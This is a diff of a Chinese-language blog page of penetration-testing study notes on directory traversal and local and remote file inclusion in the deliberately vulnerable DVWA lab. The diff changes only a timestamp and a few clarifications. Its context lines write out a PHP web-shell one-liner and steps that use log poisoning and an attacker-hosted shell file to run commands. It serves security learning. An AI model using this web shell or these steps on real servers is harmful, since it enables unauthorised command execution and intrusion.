@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Tomas&#39;Blog">
 <meta property="og:description" content="1. 手动漏洞挖掘–目录遍历&#x2F;文件包含 Directory traversal&#x2F;File include（有区别&#x2F;没区别） 目录权限限制不严&#x2F;文件包含     ⭐区别: 目录遍历：操作系统内部文件 文件包含：1.LFI包含本地文件include           2.RFI远程文件包含include（php的include函数） ▲ Directory Browser和Directory tr">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-01-08T08:03:47.181Z">
+<meta property="og:updated_time" content="2020-01-08T13:39:16.554Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -414,7 +414,7 @@
 </ul>
 <blockquote>
 <pre><code>⭐LFI的代码执行
-1.Kali开启nc侦听80端口，发送&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
+1.Kali开启nc侦听80端口（目标主机），发送&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
 2.可查看/var/log/apache2/access.log中有记录（服务器apache2日志文件）
 3.查看access.log文件www-data用户是否可以进行执行修改
 4.chmod a+rx access.log（若www-data无权限，假设可修改文件属性）
@@ -430,13 +430,13 @@
 </ul>
 <blockquote>
 <pre><code>⭐测试远程文件包含
-1.kali本地侦听80端口
+1.kali本地侦听80端口（本机端口）
 2.Web page页?page=http://Kali 地址/a.php（不存在的php页面）
 3.若kali收到请求，则表示测试成功
 ⭐远程文件包含
 1.Kali机子上vi 1.txt
 2.&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
-3.Kali机子上service apache2 start
+3.Kali机子上service apache2 start（存放在/var/www/html/）
 4.DVWA访问?page=http://kali ip地址/1.txt&amp;cmd=pwd</code></pre></blockquote>
 <ul>
 <li>DVWA的File Inclusion（low）</li>
